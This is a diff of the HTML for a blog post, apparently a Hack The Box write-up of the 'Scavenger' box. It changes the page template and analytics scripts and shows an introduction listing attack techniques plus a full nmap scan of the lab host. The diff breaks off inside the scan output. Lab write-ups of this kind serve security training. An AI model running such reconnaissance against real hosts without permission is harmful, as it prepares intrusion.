@@ -4,14 +4,12 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-        <title>Scavenger - s1ck g33k</title><meta name="Description" content="Here I will explain my path for Scavenger box from Hack The Box."><meta property="og:title" content="Scavenger" />
+        <title>Scavenger - gr4n173</title><meta name="Description" content="Here I will explain my path for Scavenger box from Hack The Box."><meta property="og:title" content="Scavenger" />
 <meta property="og:description" content="Here I will explain my path for Scavenger box from Hack The Box." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://example.com/scavenger/" />
-<meta property="og:image" content="http://example.com/scavenger/featured-image.png"/>
+<meta property="og:url" content="http://example.com/scavenger/" /><meta property="og:image" content="http://example.com/scavenger/featured-image.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-02-29T21:29:01+08:00" />
-<meta property="article:modified_time" content="2020-02-29T21:29:01+08:00" />
+<meta property="article:modified_time" content="2020-02-29T21:29:01+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="http://example.com/scavenger/featured-image.png"/>
 <meta name="twitter:title" content="Scavenger"/>
@@ -19,7 +17,9 @@
 <meta name="application-name" content="gr4n173">
 <meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/scavenger/" /><link rel="prev" href="http://example.com/zetta/" /><link rel="next" href="http://example.com/nephack3/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/scavenger/" /><link rel="prev" href="http://example.com/zetta/" /><link rel="next" href="http://example.com/nephack3/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -33,7 +33,7 @@
                             "url": "http:\/\/example.com\/scavenger\/featured-image.png",
                             "width":  583 ,
                             "height":  337 
-                        }],"genre": "posts","keywords": "linux, htb, ftp, sqli, RE, lkm, whois, pcap, ffuf, fuzz","wordcount":  2648 ,
+                        }],"genre": "posts","keywords": "linux, htb, ftp, sqli, RE, lkm, whois, pcap, ffuf, fuzz","wordcount":  2625 ,
         "url": "http:\/\/example.com\/scavenger\/","datePublished": "2020-02-29T21:29:01+08:00","dateModified": "2020-02-29T21:29:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -47,88 +47,35 @@
             },"description": "Here I will explain my path for Scavenger box from Hack The Box."
     }
     </script></head>
-    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-	<div class="header-wrapper">
+    <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="s1ck g33k"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
+            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
         </div>
         <div class="menu">
             <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
-                            <i class="fas fa-search fa-fw"></i>
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                         </a>
                         <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
-                            <i class="fas fa-times-circle fa-fw"></i>
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                         </span>
                     </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw"></i>
-                </a>
-            </div>
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
         </div>
     </div>
 </header><header class="mobile" id="header-mobile">
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-
-    
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-164630777-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-	<div class="header-container">
+    <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="s1ck g33k"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
+                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
@@ -138,37 +85,35 @@ if (!doNotTrack) {
                     <div class="search mobile" id="search-mobile">
                         <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
-                            <i class="fas fa-search fa-fw"></i>
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                         </a>
                         <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
-                            <i class="fas fa-times-circle fa-fw"></i>
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                         </span>
                     </div>
                     <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                         Cancel
                     </a>
                 </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw"></i>
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
             </a></div>
     </div>
-</header>
-<div class="search-dropdown desktop">
-    <div id="search-dropdown-desktop"></div>
-</div>
-<div class="search-dropdown mobile">
-    <div id="search-dropdown-mobile"></div>
-</div>
-<main class="main">
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animated flipInX">Scavenger</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://gr4n173.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw"></i>Hack The Box</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-02-29">2020-02-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2648 words&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Scavenger</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://gr4n173.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Hack The Box</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-02-29">2020-02-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2625 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -176,10 +121,10 @@ if (!doNotTrack) {
         data-srcset="/scavenger/featured-image.png, /scavenger/featured-image.png 1.5x, /scavenger/featured-image.png 2x"
         data-sizes="auto"
         alt="/scavenger/featured-image.png"
-        title="Here I will explain my path for Scavenger box from Hack The Box." /></div><div class="details toc" id="toc-static"  kept="">
+        title="Here I will explain my path for Scavenger box from Hack The Box." /></div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
-                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
@@ -207,26 +152,26 @@ if (!doNotTrack) {
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>Scavenger box was the hardes after <a href="https://gr4n173.github.io/zetta" target="_blank" rel="noopener noreffer">Zetta</a> box. It falls under linux and hard category. Here I will explain my path for Scavenger box from the Hack The Box.</p>
+            </div><div class="content" id="content"><p>Scavenger box was the hardes after <a href="https://gr4n173.github.io/zetta" target="_blank" rel="noopener noreffer ">Zetta</a> box. It falls under linux and hard category. Here I will explain my path for Scavenger box from the Hack The Box.</p>
 <hr>
 <h1 id="htbscavenger">HTB:Scavenger</h1>
-<p>Scavenger box was the hardest box after <a href="https://gr4n173.github.io/2020/02/22/htb-zetta.html" target="_blank" rel="noopener noreffer">Zetta</a> box. It falls under linux and hard category. Here, everything was all about enumeration, enumeration and enumeration. I&rsquo;ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using <code>whois</code> service and dns zone transfer(axfr) along with ftp by analyzing the .pcap file then used LKM to read root.txt. I&rsquo;ll show all my payload (including that didn&rsquo;t work in initial deployment to get root).</p>
+<p>Scavenger box was the hardest box after <a href="https://gr4n173.github.io/2020/02/22/htb-zetta.html" target="_blank" rel="noopener noreffer ">Zetta</a> box. It falls under linux and hard category. Here, everything was all about enumeration, enumeration and enumeration. I&rsquo;ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using <code>whois</code> service and dns zone transfer(axfr) along with ftp by analyzing the .pcap file then used LKM to read root.txt. I&rsquo;ll show all my payload (including that didn&rsquo;t work in initial deployment to get root).</p>
 <h2 id="box-details">Box Details</h2>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="public/images/Scavenger_description.png"
-        data-srcset="/scavenger/public/images/Scavenger_description.png, public/images/Scavenger_description.png 1.5x, /scavenger/public/images/Scavenger_description.png 2x"
+        data-src="/scavenger/public/images/Scavenger_description.png"
+        data-srcset="/scavenger/public/images/Scavenger_description.png, /scavenger/public/images/Scavenger_description.png 1.5x, /scavenger/public/images/Scavenger_description.png 2x"
         data-sizes="auto"
         alt="/scavenger/public/images/Scavenger_description.png"
-        title="Description of Scavenger " /></p>
+        title="Description of Scavenger " width="583" height="337" /></p>
 <p>In above picture it&rsquo;s ip is 10.10.10.155, I added it to /etc/hosts as scavenger.htb. Let&rsquo;s solve this box.</p>
 <hr>
 <h2 id="recon">Recon</h2>
 <p>Let&rsquo;s start with our universal port scanner, <code>nmap</code> to see the open port and service which shows</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -296,81 +241,79 @@ if (!doNotTrack) {
 </span><span class="lnt">68
 </span><span class="lnt">69
 </span><span class="lnt">70
-</span><span class="lnt">71
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Feb 27 23:24:41 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.155</span>
-Nmap scan report <span class="k">for</span> www.supersechosting.htb <span class="o">(</span>10.10.10.155<span class="o">)</span>
-Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
-Not shown: <span class="m">993</span> filtered ports
-PORT   STATE  SERVICE  VERSION
-20/tcp closed ftp-data
-21/tcp open   ftp      vsftpd 3.0.3
-22/tcp open   ssh      OpenSSH 7.4p1 Debian 10+deb9u4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 <span class="o">(</span>ED25519<span class="o">)</span>
-25/tcp open   smtp     Exim smtpd 4.89
-<span class="p">|</span> smtp-commands: ib01.supersechosting.htb Hello www.supersechosting.htb <span class="o">[</span>10.10.14.243<span class="o">]</span>, SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
-<span class="p">|</span>_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
-43/tcp open   whois?
-<span class="p">|</span> fingerprint-strings: 
-<span class="p">|</span>   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
-<span class="p">|</span>     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
-<span class="p">|</span>     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
-<span class="p">|</span>     This query returned <span class="m">0</span> object
-<span class="p">|</span>   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
-<span class="p">|</span>     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
-<span class="p">|</span>     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
-<span class="p">|</span>_    <span class="m">1267</span> <span class="o">(</span>HY000<span class="o">)</span>: Illegal mix of collations <span class="o">(</span>utf8mb4_general_ci,IMPLICIT<span class="o">)</span> and <span class="o">(</span>utf8_general_ci,COERCIBLE<span class="o">)</span> <span class="k">for</span> operation <span class="s1">&#39;like&#39;</span>
-53/tcp open   domain   ISC BIND 9.10.3-P4 <span class="o">(</span>Debian Linux<span class="o">)</span>
-<span class="p">|</span> dns-nsid: 
-<span class="p">|</span>_  bind.version: 9.10.3-P4-Debian
-80/tcp open   http     Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
-<span class="p">|</span>_http-title: SuperSecHosting
-<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port43-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>2/27%Time<span class="o">=</span>5E57FEF1%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Gene
-SF:ricLines,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
-</span><span class="s2">SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
-</span><span class="s2">SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
-</span><span class="s2">SF:0returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x2
-</span><span class="s2">SF:0WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20i
-</span><span class="s2">SF:nformation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersecho
-</span><span class="s2">SF:sting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>HTT
-SF:POptions,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
-</span><span class="s2">SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
-</span><span class="s2">SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
-</span><span class="s2">SF:0returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x
-</span><span class="s2">SF:20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20
-</span><span class="s2">SF:information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersech
-</span><span class="s2">SF:osting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>He
-SF:lp,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.
-</span><span class="s2">SF:1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20v
-</span><span class="s2">SF:isit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x20retur
-</span><span class="s2">SF:ned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,103,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20W
-</span><span class="s2">SF:HOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20inf
-</span><span class="s2">SF:ormation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersechost
-</span><span class="s2">SF:ing\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x20collations\x2
-</span><span class="s2">SF:0\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_general_ci,COERCIBLE\
-</span><span class="s2">SF:)\x20for\x20operation\x20&#39;like&#39;&#34;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,103,<span class="s2">&#34;%\x20SUPE
-</span><span class="s2">SF:RSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20fo
-</span><span class="s2">SF:r\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://w
-</span><span class="s2">SF:ww\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\
-</span><span class="s2">SF:x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_gener
-</span><span class="s2">SF:al_ci,COERCIBLE\)\x20for\x20operation\x20&#39;like&#39;&#34;</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionReq,103,<span class="s2">&#34;
-</span><span class="s2">SF:%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r
-</span><span class="s2">SF:\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x2
-</span><span class="s2">SF:0http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20m
-</span><span class="s2">SF:ix\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(u
-</span><span class="s2">SF:tf8_general_ci,COERCIBLE\)\x20for\x20operation\x20&#39;like&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
-Service Info: Host: ib01.supersechosting.htb<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span class="c1"># Nmap done at Thu Feb 27 23:26:45 2020 -- 1 IP address (1 host up) scanned in 123.59 seconds</span>
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Thu Feb 27 23:24:41 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.155</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> www.supersechosting.htb <span class="o">(</span>10.10.10.155<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">993</span> filtered ports
+</span></span><span class="line"><span class="cl">PORT   STATE  SERVICE  VERSION
+</span></span><span class="line"><span class="cl">20/tcp closed ftp-data
+</span></span><span class="line"><span class="cl">21/tcp open   ftp      vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp open   ssh      OpenSSH 7.4p1 Debian 10+deb9u4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">25/tcp open   smtp     Exim smtpd 4.89
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smtp-commands: ib01.supersechosting.htb Hello www.supersechosting.htb <span class="o">[</span>10.10.14.243<span class="o">]</span>, SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
+</span></span><span class="line"><span class="cl">43/tcp open   whois?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     This query returned <span class="m">0</span> object
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    <span class="m">1267</span> <span class="o">(</span>HY000<span class="o">)</span>: Illegal mix of collations <span class="o">(</span>utf8mb4_general_ci,IMPLICIT<span class="o">)</span> and <span class="o">(</span>utf8_general_ci,COERCIBLE<span class="o">)</span> <span class="k">for</span> operation <span class="s1">&#39;like&#39;</span>
+</span></span><span class="line"><span class="cl">53/tcp open   domain   ISC BIND 9.10.3-P4 <span class="o">(</span>Debian Linux<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.10.3-P4-Debian
+</span></span><span class="line"><span class="cl">80/tcp open   http     Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: SuperSecHosting
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port43-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>2/27%Time<span class="o">=</span>5E57FEF1%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Gene
+</span></span><span class="line"><span class="cl">SF:ricLines,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0returned\x200\x20object\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,A9,<span class="s2">&#34;%\x20SUPERSECHOSTING\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20i
